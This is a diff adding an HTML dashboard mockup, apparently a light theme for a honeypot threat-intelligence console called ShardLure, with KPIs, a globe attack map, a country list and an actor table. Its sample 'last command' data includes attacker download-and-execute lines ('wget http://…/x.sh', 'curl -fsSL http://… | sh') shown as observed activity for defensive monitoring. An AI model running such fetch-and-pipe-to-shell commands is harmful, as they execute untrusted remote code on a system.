@@ -1,0 +1,691 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Clearing · ShardLure theme study</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet" />
+<style>
+  /* ─────────────────────────────────────────────────────────────
+     CLEARING — light trust console
+     Daytime operator surface. Paper + white cards + one ink-blue.
+     Stripe / Linear-light restraint. Soft elevation, no glass soup.
+     Map stays compact; table does the work.
+     ───────────────────────────────────────────────────────────── */
+  :root {
+    --bg: #f4f5f7;
+    --paper: #ffffff;
+    --paper-2: #fafafa;
+    --line: #e4e6eb;
+    --line-2: #d0d4dc;
+    --ink: #141820;
+    --muted: #5c6575;
+    --dim: #8b93a2;
+    --brand: #1f3a5f;
+    --brand-soft: rgba(31, 58, 95, 0.08);
+    --focus: #2f5d9f;
+    --ok: #1f7a4c;
+    --warn: #a67c00;
+    --bad: #c0392b;
+    --sans: "Inter", system-ui, -apple-system, sans-serif;
+    --mono: "IBM Plex Mono", ui-monospace, monospace;
+    --shadow: 0 1px 2px rgba(20, 24, 32, 0.04), 0 4px 12px rgba(20, 24, 32, 0.04);
+  }
+
+  * { box-sizing: border-box; }
+  html, body { height: 100%; margin: 0; }
+  body {
+    font: 13px/1.45 var(--sans);
+    color: var(--ink);
+    background: var(--bg);
+    overflow: hidden;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .app {
+    display: grid;
+    grid-template-columns: 216px 1fr;
+    grid-template-rows: 52px 1fr;
+    height: 100vh;
+  }
+
+  /* top */
+  .top {
+    grid-column: 1 / -1;
+    display: flex; align-items: center; gap: 14px;
+    padding: 0 16px;
+    background: var(--paper);
+    border-bottom: 1px solid var(--line);
+  }
+  .brand {
+    display: flex; align-items: center; gap: 10px;
+    min-width: 196px;
+    font: 600 13.5px var(--sans);
+    color: var(--ink);
+  }
+  .brand .mark {
+    width: 22px; height: 22px;
+    border-radius: 6px;
+    background: var(--brand);
+  }
+  .brand span {
+    font-weight: 400;
+    color: var(--muted);
+    margin-left: 2px;
+  }
+  .search {
+    flex: 1;
+    max-width: 420px;
+    display: flex; align-items: center; gap: 8px;
+    background: var(--bg);
+    border: 1px solid var(--line);
+    border-radius: 8px;
+    padding: 8px 12px;
+    color: var(--dim);
+    font: 400 12.5px var(--sans);
+  }
+  .search kbd {
+    margin-left: auto;
+    font: 500 10px var(--mono);
+    color: var(--dim);
+    border: 1px solid var(--line-2);
+    border-radius: 4px;
+    padding: 1px 5px;
+    background: var(--paper);
+  }
+  .top-meta {
+    margin-left: auto;
+    display: flex; align-items: center; gap: 10px;
+    font: 500 12px var(--sans);
+    color: var(--muted);
+  }
+  .live {
+    display: inline-flex; align-items: center; gap: 6px;
+    color: var(--ok);
+    font: 500 11.5px var(--sans);
+  }
+  .live::before {
+    content: "";
+    width: 6px; height: 6px; border-radius: 50%;
+    background: var(--ok);
+  }
+  .top-meta a {
+    color: var(--muted);
+    text-decoration: none;
+    border: 1px solid var(--line);
+    border-radius: 7px;
+    padding: 6px 10px;
+    background: var(--paper);
+  }
+  .top-meta a:hover { color: var(--ink); border-color: var(--line-2); }
+
+  /* nav */
+  .nav {
+    background: var(--paper);
+    border-right: 1px solid var(--line);
+    padding: 12px 10px;
+    overflow: auto;
+    display: flex; flex-direction: column; gap: 2px;
+  }
+  .nav .sec {
+    font: 600 10px var(--sans);
+    letter-spacing: 0.06em;
+    text-transform: uppercase;
+    color: var(--dim);
+    padding: 14px 10px 6px;
+  }
+  .nav a {
+    display: flex; align-items: center; gap: 8px;
+    text-decoration: none;
+    color: var(--muted);
+    font: 500 13px var(--sans);
+    padding: 8px 10px;
+    border-radius: 8px;
+  }
+  .nav a:hover { background: var(--bg); color: var(--ink); }
+  .nav a.on {
+    background: var(--brand-soft);
+    color: var(--brand);
+  }
+  .nav a .n {
+    margin-left: auto;
+    font: 500 11px var(--mono);
+    color: var(--dim);
+  }
+
+  /* main */
+  .main {
+    display: grid;
+    grid-template-rows: auto auto minmax(200px, 32vh) 1fr;
+    min-width: 0;
+    overflow: hidden;
+    padding: 0;
+  }
+
+  .toolbar {
+    display: flex; align-items: center; gap: 8px; flex-wrap: wrap;
+    padding: 16px 18px 10px;
+  }
+  .toolbar h1 {
+    margin: 0 8px 0 0;
+    font: 600 17px/1.2 var(--sans);
+    letter-spacing: -0.02em;
+  }
+  .chip {
+    font: 500 11.5px var(--sans);
+    color: var(--muted);
+    background: var(--paper);
+    border: 1px solid var(--line);
+    border-radius: 999px;
+    padding: 5px 11px;
+    cursor: pointer;
+    box-shadow: var(--shadow);
+  }
+  .chip.on {
+    color: var(--brand);
+    border-color: rgba(31, 58, 95, 0.28);
+    background: var(--brand-soft);
+    box-shadow: none;
+  }
+  .toolbar .right {
+    margin-left: auto;
+    display: flex; gap: 8px;
+  }
+  .btn {
+    font: 500 12px var(--sans);
+    border: 1px solid var(--line);
+    background: var(--paper);
+    color: var(--ink);
+    border-radius: 8px;
+    padding: 7px 12px;
+    cursor: pointer;
+    box-shadow: var(--shadow);
+  }
+  .btn:hover { border-color: var(--line-2); }
+  .btn.primary {
+    background: var(--brand);
+    border-color: var(--brand);
+    color: #fff;
+    box-shadow: none;
+  }
+
+  .kpis {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 10px;
+    padding: 0 18px 12px;
+  }
+  .kpi {
+    background: var(--paper);
+    border: 1px solid var(--line);
+    border-radius: 12px;
+    padding: 14px 16px;
+    box-shadow: var(--shadow);
+  }
+  .kpi .n {
+    font: 600 22px/1 var(--sans);
+    letter-spacing: -0.03em;
+    font-variant-numeric: tabular-nums;
+  }
+  .kpi .l {
+    margin-top: 5px;
+    font: 500 11.5px var(--sans);
+    color: var(--muted);
+  }
+  .kpi .s {
+    margin-top: 6px;
+    font: 500 11px var(--mono);
+    color: var(--ok);
+  }
+  .kpi .s.dn { color: var(--bad); }
+
+  /* compact map row */
+  .map-band {
+    display: grid;
+    grid-template-columns: minmax(220px, 300px) 1fr;
+    gap: 10px;
+    padding: 0 18px 12px;
+    min-height: 0;
+  }
+  .map-card, .geo-card {
+    background: var(--paper);
+    border: 1px solid var(--line);
+    border-radius: 12px;
+    box-shadow: var(--shadow);
+    min-height: 0;
+    overflow: hidden;
+  }
+  .map-card {
+    display: grid;
+    grid-template-rows: auto 1fr auto;
+  }
+  .panel-head {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 10px 12px;
+    border-bottom: 1px solid var(--line);
+    font: 500 12px var(--sans);
+    color: var(--muted);
+  }
+  .panel-head strong { color: var(--ink); font-weight: 600; }
+  .panel-head .ang {
+    font: 500 10px var(--mono);
+    color: var(--dim);
+  }
+  #globe-wrap {
+    position: relative;
+    width: 100%;
+    height: 100%;
+    min-height: 160px;
+    background: #12151a;
+  }
+  #cobe { width: 100%; height: 100%; display: block; cursor: grab; }
+  #cobe:active { cursor: grabbing; }
+  .focus {
+    display: flex; flex-wrap: wrap; gap: 4px;
+    padding: 8px 10px;
+    border-top: 1px solid var(--line);
+    background: var(--paper-2);
+  }
+  .focus button {
+    font: 500 10.5px var(--sans);
+    color: var(--muted);
+    background: var(--paper);
+    border: 1px solid var(--line);
+    border-radius: 999px;
+    padding: 4px 9px;
+    cursor: pointer;
+  }
+  .focus button.on,
+  .focus button:hover {
+    color: var(--brand);
+    border-color: rgba(31, 58, 95, 0.3);
+    background: var(--brand-soft);
+  }
+
+  .geo-card {
+    display: grid;
+    grid-template-rows: auto 1fr;
+  }
+  .geo-list {
+    overflow: auto;
+    padding: 6px 8px 10px;
+  }
+  .geo-row {
+    display: grid;
+    grid-template-columns: 24px 1fr 68px;
+    gap: 8px;
+    align-items: center;
+    padding: 8px 6px;
+    border-radius: 8px;
+  }
+  .geo-row:hover { background: var(--bg); }
+  .geo-row .rank {
+    font: 500 11px var(--mono);
+    color: var(--dim);
+  }
+  .geo-row .name {
+    font: 500 12.5px var(--sans);
+  }
+  .geo-row .name small {
+    display: block;
+    margin-top: 1px;
+    font: 400 10px var(--mono);
+    color: var(--dim);
+  }
+  .geo-row .hits {
+    text-align: right;
+    font: 500 11.5px var(--mono);
+    color: var(--muted);
+  }
+  .geo-row .bar {
+    grid-column: 2 / -1;
+    height: 3px;
+    background: var(--line);
+    border-radius: 999px;
+    overflow: hidden;
+    margin-top: -2px;
+  }
+  .geo-row .bar i {
+    display: block; height: 100%;
+    background: var(--brand);
+    border-radius: 999px;
+  }
+
+  .table-card {
+    margin: 0 18px 18px;
+    background: var(--paper);
+    border: 1px solid var(--line);
+    border-radius: 12px;
+    box-shadow: var(--shadow);
+    overflow: auto;
+    min-height: 0;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font: 12.5px var(--sans);
+  }
+  th {
+    position: sticky; top: 0; z-index: 1;
+    background: var(--paper-2);
+    text-align: left;
+    font: 500 11px var(--sans);
+    color: var(--dim);
+    padding: 10px 12px;
+    border-bottom: 1px solid var(--line);
+    white-space: nowrap;
+  }
+  td {
+    padding: 10px 12px;
+    border-bottom: 1px solid var(--line);
+    vertical-align: middle;
+  }
+  tr:last-child td { border-bottom: 0; }
+  tr:hover td { background: #f8f9fb; }
+  tr.selected td { background: var(--brand-soft); }
+  td.mono { font-family: var(--mono); font-size: 11.5px; }
+  .dot {
+    width: 7px; height: 7px; border-radius: 50%;
+    display: inline-block;
+  }
+  .dot.h { background: var(--bad); }
+  .dot.m { background: var(--warn); }
+  .dot.l { background: var(--ok); }
+  .tag {
+    display: inline-block;
+    font: 500 11px var(--sans);
+    padding: 2px 7px;
+    border-radius: 999px;
+    border: 1px solid var(--line);
+    color: var(--muted);
+    background: var(--bg);
+  }
+  .tag.probe { color: var(--focus); border-color: rgba(47, 93, 159, 0.25); background: rgba(47, 93, 159, 0.06); }
+  .tag.deploy { color: var(--warn); border-color: rgba(166, 124, 0, 0.25); background: rgba(166, 124, 0, 0.06); }
+  .tag.proxy { color: var(--ok); border-color: rgba(31, 122, 76, 0.25); background: rgba(31, 122, 76, 0.06); }
+
+  .drawer {
+    position: fixed;
+    top: 52px; right: 0; bottom: 0;
+    width: min(340px, 92vw);
+    background: var(--paper);
+    border-left: 1px solid var(--line);
+    box-shadow: -8px 0 24px rgba(20, 24, 32, 0.06);
+    padding: 16px;
+    transform: translateX(105%);
+    transition: transform .16s ease;
+    z-index: 20;
+    overflow: auto;
+  }
+  .drawer.open { transform: none; }
+  .drawer h2 {
+    margin: 0 0 2px;
+    font: 600 15px var(--sans);
+  }
+  .drawer .sub {
+    font: 400 12px var(--mono);
+    color: var(--muted);
+    margin-bottom: 14px;
+  }
+  .kv {
+    display: grid;
+    grid-template-columns: 90px 1fr;
+    gap: 6px 10px;
+    padding: 7px 0;
+    border-bottom: 1px solid var(--line);
+    font: 12.5px var(--sans);
+  }
+  .kv span { color: var(--dim); }
+  .kv b { font-weight: 500; word-break: break-all; }
+  .cmdbox {
+    margin-top: 12px;
+    background: var(--bg);
+    border: 1px solid var(--line);
+    border-radius: 8px;
+    padding: 10px 12px;
+    font: 12px var(--mono);
+    color: var(--muted);
+  }
+
+  @media (max-width: 1100px) {
+    .map-band { grid-template-columns: 1fr; }
+    .map-card { max-height: 220px; }
+  }
+  @media (max-width: 900px) {
+    .app { grid-template-columns: 1fr; }
+    .nav { display: none; }
+    .kpis { grid-template-columns: 1fr 1fr; }
+  }
+</style>
+</head>
+<body>
+<div class="app">
+  <header class="top">
+    <div class="brand">
+      <span class="mark" aria-hidden="true"></span>
+      ShardLure <span>· Clearing</span>
+    </div>
+    <div class="search" title="Search">
+      <span>Search actors, playbooks, IPs…</span>
+      <kbd>⌘K</kbd>
+    </div>
+    <div class="top-meta">
+      <span class="live">Ingest live</span>
+      <span id="clock">—</span>
+      <a href="./index.html">Studies</a>
+    </div>
+  </header>
+
+  <nav class="nav">
+    <div class="sec">Workspace</div>
+    <a class="on" href="#"><span>Overview</span></a>
+    <a href="#"><span>Actors</span><span class="n">1.3k</span></a>
+    <a href="#"><span>Events</span><span class="n">118k</span></a>
+    <a href="#"><span>Sessions</span></a>
+    <a href="#"><span>Capture</span></a>
+    <div class="sec">Intel</div>
+    <a href="#"><span>Playbooks</span></a>
+    <a href="#"><span>IOCs</span></a>
+    <div class="sec">System</div>
+    <a href="#"><span>Sources</span></a>
+    <a href="#"><span>Settings</span></a>
+  </nav>
+
+  <main class="main">
+    <div class="toolbar">
+      <h1>Overview</h1>
+      <button type="button" class="chip on" data-f="all">All</button>
+      <button type="button" class="chip" data-f="probe">Probe</button>
+      <button type="button" class="chip" data-f="deploy">Deploy</button>
+      <button type="button" class="chip" data-f="proxy">Proxy</button>
+      <div class="right">
+        <button type="button" class="btn">Export</button>
+        <button type="button" class="btn primary">Enrich</button>
+      </div>
+    </div>
+
+    <div class="kpis" id="kpis"></div>
+
+    <section class="map-band">
+      <div class="map-card">
+        <div class="panel-head">
+          <span><strong>Attack map</strong> · Mumbai origin</span>
+          <span class="ang">φ <span id="phi">—</span> · θ <span id="theta">—</span></span>
+        </div>
+        <div id="globe-wrap">
+          <canvas id="cobe" width="800" height="800"></canvas>
+        </div>
+        <div class="focus" id="focuses"></div>
+      </div>
+      <div class="geo-card">
+        <div class="panel-head"><span><strong>Countries</strong> · 72h</span><span>volume</span></div>
+        <div class="geo-list" id="countries"></div>
+      </div>
+    </section>
+
+    <div class="table-card">
+      <table>
+        <thead>
+          <tr>
+            <th></th>
+            <th>IP</th>
+            <th>Playbook</th>
+            <th>Intent</th>
+            <th>CC</th>
+            <th>Events</th>
+            <th>Probe</th>
+            <th>Last command</th>
+          </tr>
+        </thead>
+        <tbody id="rows"></tbody>
+      </table>
+    </div>
+  </main>
+</div>
+
+<aside class="drawer" id="drawer">
+  <h2 id="d-title">Actor</h2>
+  <div class="sub" id="d-sub">—</div>
+  <div id="d-kv"></div>
+  <div class="cmdbox" id="d-cmd">—</div>
+</aside>
+
+<script type="importmap">
+{
+  "imports": { "cobe": "https://esm.sh/cobe@2.0.0" }
+}
+</script>
+<script type="module">
+import createGlobe from "cobe";
+import {
+  SUMMARY, ACTORS, CAPTURE, COUNTRIES, PLACES,
+  fmt, tickClock, globeEntities,
+  bindGlobeInteraction, startGlobeLoop, wireFocusButtons,
+} from "./_shared.js";
+
+tickClock(document.getElementById("clock"));
+
+document.getElementById("kpis").innerHTML = `
+  <div class="kpi"><div class="n">${fmt(SUMMARY.events)}</div><div class="l">Events · 72h</div><div class="s">▲ 12% vs prior</div></div>
+  <div class="kpi"><div class="n">${fmt(SUMMARY.actors)}</div><div class="l">Actors</div><div class="s">▲ 4%</div></div>
+  <div class="kpi"><div class="n">${fmt(SUMMARY.ips)}</div><div class="l">Unique IPs</div><div class="s dn">▼ 2%</div></div>
+  <div class="kpi"><div class="n">${CAPTURE.saved}</div><div class="l">Payloads saved</div><div class="s" style="color:var(--muted)">${CAPTURE.bytes} held</div></div>`;
+
+const maxC = COUNTRIES[0].hits;
+document.getElementById("countries").innerHTML = COUNTRIES.map((c, i) => `
+  <div class="geo-row">
+    <span class="rank">${String(i + 1).padStart(2, "0")}</span>
+    <span class="name">${c.name}<small>${c.cc}</small></span>
+    <span class="hits">${fmt(c.hits)}</span>
+    <div class="bar"><i style="width:${(c.hits / maxC * 100).toFixed(1)}%"></i></div>
+  </div>`).join("");
+
+const intents = ["probe", "deploy", "proxy", "probe", "mixed"];
+const cmds = [
+  "uname -s -v -n -r -m",
+  "cat /proc/cpuinfo",
+  "wget http://…/x.sh",
+  "curl -fsSL http://… | sh",
+  "uname -a",
+];
+
+const rowData = ACTORS.map((a, i) => ({
+  ...a,
+  intent: intents[i % intents.length],
+  probe: 40 + (i * 11) % 50,
+  cmd: cmds[i % cmds.length],
+  sev: a.events > 5000 ? "h" : a.events > 1500 ? "m" : "l",
+}));
+
+const rows = document.getElementById("rows");
+function paintRows(list) {
+  rows.innerHTML = list.map((a, i) => `
+    <tr data-i="${rowData.indexOf(a)}" data-intent="${a.intent}">
+      <td><span class="dot ${a.sev}"></span></td>
+      <td class="mono">${a.ip}</td>
+      <td>${a.playbook}</td>
+      <td><span class="tag ${a.intent}">${a.intent}</span></td>
+      <td>${a.cc}</td>
+      <td class="mono">${fmt(a.events)}</td>
+      <td class="mono">${a.probe}</td>
+      <td class="mono" style="color:var(--muted)">${a.cmd}</td>
+    </tr>`).join("");
+}
+paintRows(rowData);
+
+const drawer = document.getElementById("drawer");
+rows.addEventListener("click", (e) => {
+  const tr = e.target.closest("tr");
+  if (!tr) return;
+  rows.querySelectorAll("tr").forEach((r) => r.classList.remove("selected"));
+  tr.classList.add("selected");
+  const a = rowData[+tr.dataset.i];
+  document.getElementById("d-title").textContent = a.ip;
+  document.getElementById("d-sub").textContent = `${a.playbook} · ${a.cc}`;
+  document.getElementById("d-kv").innerHTML = `
+    <div class="kv"><span>Intent</span><b>${a.intent}</b></div>
+    <div class="kv"><span>Events</span><b>${fmt(a.events)}</b></div>
+    <div class="kv"><span>Probe</span><b>${a.probe}</b></div>
+    <div class="kv"><span>Cluster</span><b>cowrie:hassh · family</b></div>
+    <div class="kv"><span>Origin</span><b>Mumbai honeypot</b></div>`;
+  document.getElementById("d-cmd").textContent = a.cmd;
+  drawer.classList.add("open");
+});
+
+document.querySelectorAll(".chip").forEach((btn) => {
+  btn.addEventListener("click", () => {
+    document.querySelectorAll(".chip").forEach((b) => b.classList.remove("on"));
+    btn.classList.add("on");
+    const f = btn.dataset.f;
+    paintRows(f === "all" ? rowData : rowData.filter((a) => a.intent === f));
+  });
+});
+
+addEventListener("keydown", (e) => {
+  if (e.key === "Escape") drawer.classList.remove("open");
+});
+
+const canvas = document.getElementById("cobe");
+const wrap = document.getElementById("globe-wrap");
+const state = {
+  phi: 2.4, theta: 0.22,
+  targetPhi: 2.4, targetTheta: 0.22,
+  scale: 1, targetScale: 1, autoRotate: true,
+};
+const { markers, arcs } = globeEntities({
+  home: [0.12, 0.23, 0.37],
+  hot: [0.12, 0.23, 0.37],
+  cool: [0.45, 0.48, 0.52],
+  arc: [0.18, 0.30, 0.48],
+});
+const size = () => Math.min(wrap.clientWidth, wrap.clientHeight) * 2;
+const ix = bindGlobeInteraction(canvas, state, { wrap, places: PLACES });
+wireFocusButtons(document.getElementById("focuses"), ix);
+const globe = createGlobe(canvas, {
+  devicePixelRatio: 2,
+  width: size(), height: size(),
+  phi: state.phi, theta: state.theta,
+  dark: 1, diffuse: 1.1,
+  mapSamples: 17000,
+  mapBrightness: 2.6,
+  mapBaseBrightness: 0.03,
+  baseColor: [0.08, 0.09, 0.11],
+  markerColor: [0.18, 0.32, 0.52],
+  glowColor: [0.14, 0.16, 0.2],
+  markerElevation: 0.01,
+  arcColor: [0.22, 0.35, 0.55],
+  arcWidth: 0.42, arcHeight: 0.25,
+  markers, arcs,
+});
+startGlobeLoop(globe, ix, (view) => {
+  document.getElementById("phi").textContent = view.phi.toFixed(2);
+  document.getElementById("theta").textContent = view.theta.toFixed(2);
+});
+addEventListener("resize", () => {
+  const s = size();
+  globe.update({ width: s, height: s });
+});
+</script>
+</body>
+</html>
